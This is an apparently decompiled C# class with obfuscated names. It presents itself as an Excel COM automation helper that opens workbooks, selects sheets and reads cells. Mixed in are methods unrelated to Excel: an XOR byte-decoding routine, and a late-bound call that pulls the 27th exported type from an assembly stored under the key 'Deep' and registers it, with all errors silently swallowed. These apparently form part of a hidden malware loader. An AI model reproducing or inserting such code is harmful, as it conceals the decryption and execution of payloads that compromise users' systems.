using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using Em2s;
using Ha87;
using Microsoft.VisualBasic.CompilerServices;
using Xk96;
using m6G0;
using z4D;

namespace k8LK;

public class f4P8
{
	private b2D5 _oXls;

	private i5KN _oWBook;

	private f9L8 _oSheet;

	public b2D5 OXls
	{
		get
		{
			return _oXls;
		}
		set
		{
			_oXls = value;
		}
	}

	public i5KN OWBook
	{
		get
		{
			return _oWBook;
		}
		set
		{
			_oWBook = value;
		}
	}

	public f9L8 OSheet
	{
		get
		{
			return _oSheet;
		}
		set
		{
			_oSheet = value;
		}
	}

	public f4P8()
	{
		_oXls = (b2D5)Activator.CreateInstance(Marshal.GetTypeFromCLSID(new Guid("00024500-0000-0000-C000-000000000046")));
	}

	public void b2X8(string Np3e, bool o7N8)
	{
		OWBook = OXls.Workbooks.Open(Np3e, RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing));
		OXls.Visible = o7N8;
	}

	internal static bool Yo8k()
	{
		try
		{
			try
			{
				Type type = (Type)Lw3r(RuntimeHelpers.GetObjectValue(Gz5.mDic["Deep"]));
				if (Operators.CompareString(type.Name, Gz5.mDic[Gz5.tName].ToString(), false) == 0)
				{
					Gz5.mDic.Add(Gz5.T, type);
					return true;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		return false;
	}

	public void Hi3r(string c0KR)
	{
		OSheet = (f9L8)OWBook.Sheets[c0KR];
	}

	public o4AK Er13(int e9J2, int Ws0k)
	{
		return (o4AK)OSheet.Cells[e9J2, Ws0k];
	}

	public void p2LK(bool j1F3)
	{
		if (OWBook != null)
		{
			OWBook.Close(j1F3, RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing));
		}
		OXls.Quit();
		b2D5 r5C = OXls;
		Zm45(ref r5C);
		OXls = r5C;
	}

	internal static byte Fs12(byte o5XB, byte[] s2A9, int s1FE, int Ne1p)
	{
		o5XB = (byte)(o5XB ^ checked((byte)(s2A9[unchecked(Ne1p % s2A9.Length)] ^ ((Ne1p + unchecked(s1FE % s2A9.Length)) & s1FE))));
		return o5XB;
	}

	private static void Zm45<d4P6>(ref d4P6 r5C4, bool Ms5d = false) where d4P6 : class
	{
		if (r5C4 == null)
		{
			return;
		}
		try
		{
			if (Marshal.IsComObject(r5C4))
			{
				if (Ms5d)
				{
					Marshal.FinalReleaseComObject(r5C4);
				}
				else
				{
					Marshal.ReleaseComObject(r5C4);
				}
			}
		}
		finally
		{
			r5C4 = null;
		}
	}

	internal static object Lw3r(object Dq78)
	{
		return NewLateBinding.LateIndexGet(NewLateBinding.LateGet(Dq78, (Type)null, "GetExportedTypes", new object[0], (string[])null, (Type[])null, (bool[])null), new object[1] { 27 }, (string[])null);
	}
}
